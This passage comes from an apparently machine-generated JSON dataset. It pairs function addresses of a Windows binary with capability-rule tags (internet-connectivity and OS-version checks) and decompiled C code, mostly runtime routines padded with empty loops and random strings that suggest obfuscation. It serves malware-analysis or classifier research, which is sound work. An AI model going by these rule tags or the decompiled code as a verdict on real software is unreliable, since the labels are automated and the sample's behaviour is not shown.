        "decompiled_code": "\nuint __cdecl fcn.0040539e(uchar *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 300
    },
    "004053a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004053a3(uint arg_8h)\n\n{\n    int32_t iStack72;\n    int32_t iStack68;\n    \n    for (iStack68 = 0x3c; 0 < iStack68; iStack68 = iStack68 + -1) {\n    }\n    for (iStack72 = 0x4c; 0 < iStack72; iStack72 = iStack72 + -1) {\n    }\n    fcn.00403b02();\n    return *0x546a14;\n}\n",
        "token_count": 123
    },
    "004053da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053da(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    if (arg_8h != 0) {\n        LOCK();\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) + -1;\n        piVar1 = *(arg_8h + 0x7c);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x84);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x80);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        piVar1 = *(arg_8h + 0x8c);\n        if (piVar1 != NULL) {\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n        }\n        ppiVar2 = arg_8h + 0x28;\n        iVar3 = 6;\n        do {\n            if ((ppiVar2[-2] != 0x571f60) && (piVar1 = *ppiVar2,  piVar1 != NULL)) {\n                LOCK();\n                *piVar1 = *piVar1 + -1;\n            }\n            if ((ppiVar2[-3] != NULL) && (piVar1 = ppiVar2[-1],  piVar1 != NULL)) {\n                LOCK();\n                *piVar1 = *piVar1 + -1;\n            }\n            ppiVar2 = ppiVar2 + 4;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00401339(*(arg_8h + 0x9c));\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "004053e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.004053e4(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_ch = 0x36; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00403b02(&stack0x00000010, &stack0x00000034, var_ch, 0x7c5);\n    fcn.00403b02();\n    return 0x5ce0;\n}\n",
        "token_count": 198
    },
    "00405402": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405402(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        fcn.004058a8(arg_10h);\n        if (*(var_ch + 0xa8) == 0) {\n            iVar3 = fcn.00403026(arg_8h, arg_ch);\n        }\n        else {\n            do {\n                uVar4 = fcn.00403684(*arg_8h, &var_ch);\n                uVar1 = *arg_ch;\n                arg_8h = arg_8h + 1;\n                arg_ch = arg_ch + 1;\n                uVar5 = fcn.00403684(uVar1, &var_ch);\n                iVar3 = (uVar4 & 0xffff) - (uVar5 & 0xffff);\n                if (iVar3 != 0) break;\n            } while ((uVar4 & 0xffff) != 0);\n        }\n        if (var_4h != '\\0') {\n            *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 451
    },
    "0040540c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040540c(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 342
    },
    "0040542f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040542f(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint lpName;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    lpName = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch._0_1_ = '\\0';\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_1_ = '\\0';\n    arg_10h = fcn.00403b9d();\n    iVar1 = fcn.00404f07(arg_8h, &var_30h, arg_10h);\n    if (iVar1 == 0) {\n        uVar3 = fcn.00403b9d();\n        iVar1 = fcn.00404f07(arg_ch, &var_18h, uVar3);\n        uVar3 = var_10h;\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(lpName, var_10h);\n        }\n    }\n    if (var_4h != '\\0') {\n        fcn.0040640b(uVar3);\n    }\n    if (var_1ch != '\\0') {\n        fcn.0040640b(lpName);\n    }\n    return uVar2;\n}\n",
        "token_count": 467
    },
    "00405498": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.00405498(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    uint *var_2ch;\n    char *var_24h;\n    uint *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if (**0x574458 == 'X') {\n        *0x574458 = *0x574458 + 1;\n        var_24h = \"void\";\n        var_20h = 0x4;\n        fcn.00402d47(&fcn.00405498::var_24h);\n    }\n    else if (**0x574458 == '?') {\n        fcn.0040632f(&fcn.00405498::var_24h);\n        if (((*0x574460 & 0x4000) != 0) && (*0x574468 != NULL)) {\n            fcn.00403e54(&fcn.00405498::var_14h, 0x10);\n            pcVar1 = *0x574468;\n            uVar2 = fcn.00406799(&fcn.00405498::var_14h);\n            (**0x578000)(uVar2);\n            arg_8h_00 = (*pcVar1)();\n            if (arg_8h_00 != 0) {\n                var_20h = var_20h & 0xffffff00;\n                var_2ch = var_20h;\n                fcn.00404cd7(arg_8h_00);\n                goto code_r0x00492702;\n            }\n        }\n        var_20h = &fcn.00405498::var_1ch;\n        var_1ch = \"`template-parameter\";\n        var_18h = 0x13;\n        var_24h = 0x4926d2;\n        fcn.00402d47(var_20h);\n        var_24h = &fcn.00405498::var_24h;\n        fcn.004053b7(&fcn.00405498::var_1ch, var_24h);\n        var_2ch = 0x27;\n        fcn.0040330f(arg_8h, 0x27);\n    }\n    else {\n        var_1ch = NULL;\n        var_18h = 0;\n        fcn.00403693(arg_8h, &fcn.00405498::var_1ch);\n    }\ncode_r0x00492702:\n    fcn.004030bc(var_2ch);\n    return;\n}\n",
        "token_count": 658
    },
    "0040549d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040549d(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    uint32_t uVar2;\n    \n    if (arg_ch == 0) {\n        return;\n    }\n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\ncode_r0x004a9a70:\n            *arg_10h = -1;\n            return;\n        }\n    }\n    else {\n        uVar2 = piVar1[1] - piVar1[2];\n        if (arg_ch <= uVar2) {\n            uVar2 = arg_ch;\n        }\n        fcn.00405830(*piVar1, arg_8h, uVar2);\n        **in_ECX = **in_ECX + uVar2;\n        (*in_ECX)[2] = (*in_ECX)[2] + uVar2;\n        if (*(*in_ECX + 3) == '\\0') {\n            if (uVar2 == arg_ch) {\n                *arg_10h = *arg_10h + uVar2;\n                return;\n            }\n            goto code_r0x004a9a70;\n        }\n    }\n    *arg_10h = *arg_10h + arg_ch;\n    return;\n}\n",
        "token_count": 328
    },
    "004054a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004054a7(uint arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffb4;\n    var_10h = 0xffffffff;\n    var_14h = 0x427060;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.0040620d(0);\n    var_24h = *0x573bcc;\n    arg_8h_01 = fcn.004052f4();\n    var_10h = 0;\n    var_2ch = fcn.00402171(arg_8h_01);\n    if (var_2ch == NULL) {\n        if (var_24h == NULL) {\n            iVar1 = fcn.00404589(&var_24h, arg_8h);\n            if (iVar1 == -1) {\n                fcn.004058b7();\n            }\n            arg_8h_00 = var_24h;\n            fcn.00403e59(var_24h);\n            var_10h = 1;\n            fcn.004023e2(arg_8h_00);\n            (**(*arg_8h_00 + 4))();\n            *0x573bcc = var_24h;\n            var_2ch = var_24h;\n            fcn.004058e4();\n            fcn.0040153c();\n        }\n        else {\n            var_2ch = var_24h;\n        }\n    }\n    fcn.004036f2();\n    *in_FS_OFFSET = var_18h;\n    return var_2ch;\n}\n",
        "token_count": 501
    },
    "004054b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004054b6(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "004054ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.004054ca(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack96;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4180b0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"wwieitodrdxldaacrxvbyuzgmaxeaipgxtdcy\");\n    for (iStack96 = 0x2e; 0 < iStack96; iStack96 = iStack96 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec254;\n}\n",
        "token_count": 228
    },
    "004054d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004054d4(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x4509c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"tqnmjpaecgjszjijyrgywflmwswbwrhghpcnivaexrgzbws\");\n    for (var_50h = 0x60; 0 < var_50h; var_50h = var_50h + -1) {\n    }\n    var_10h = 0;\n    fcn.00401e79(\"hkdhzyjr\");\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 282
    },
    "0041d600": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d600(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040638e();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 95
    },
    "0040551a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040551a(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049fec8;\n            param_1[7] = 8;\ncode_r0x0049fd93:\n            puStack8 = 0x49fd98;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x49fda3;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049fd93;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049fec8;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049fec8;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049fec8;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049fec8;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049fec8;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049fec8;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049fec8:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049fec8;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a1d1e:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a1d22:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1d25:\n            cVar5 = fcn.00402356(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a1cca:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1d25;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a1cde;\n                if (uVar9 < 0x45) goto code_r0x004a1eae;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a1eae;\n                    goto code_r0x004a1cb2;\n                }\n            }\ncode_r0x004a1d2e:\n            cVar5 = fcn.0040509c();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.004069fb();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a1d2e;\n            if (uVar9 != 99) goto code_r0x004a1eae;\ncode_r0x004a1cde:\n            cVar5 = fcn.004040b1(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00401b95();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a1d2e;\n            if (uVar9 == 0x69) goto code_r0x004a1d1e;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.004044ee();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a1eae;\n                cVar5 = fcn.00402248();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a1eae;\n                arg_ch_00 = 0;\n                goto code_r0x004a1cca;\n            }\n            goto code_r0x004a1d22;\n        }\ncode_r0x004a1cb2:\n        cVar5 = fcn.00402293();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004a1eae;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a1db9;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a1db9:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402978(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.0040133e(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a1eae:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2643
    },
    "0040553d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040553d(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.0040549d(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.0040549d(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 399
    },
    "00405579": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405579(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint var_70h;\n    uint var_54h;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4512e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 3;\n    fcn.00401e79(\"qjkhyifszzrtasvbociczuci\");\n    var_10h = 4;\n    fcn.00401e79(\"vyhdnfklwfjyqqcpsbstywchoyaywxwkcxgnmkdqpdskigjxsohutlhtiklwq\");\n    var_10h = 5;\n    fcn.00401e79(\"zpislgmfxzrhyigqfghkdtviqqeiehjedqkdgzicqruxaqgrfeazhrbxmbpqhnmxgewuaphqgwoodzheqbtha\");\n    for (var_78h = 0xd; 0 < var_78h; var_78h = var_78h + -1) {\n    }\n    for (var_7ch = 0x48; 0 < var_7ch; var_7ch = var_7ch + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0xff7e;\n}\n",
        "token_count": 473
    },
    "00405592": {
        "rules": [
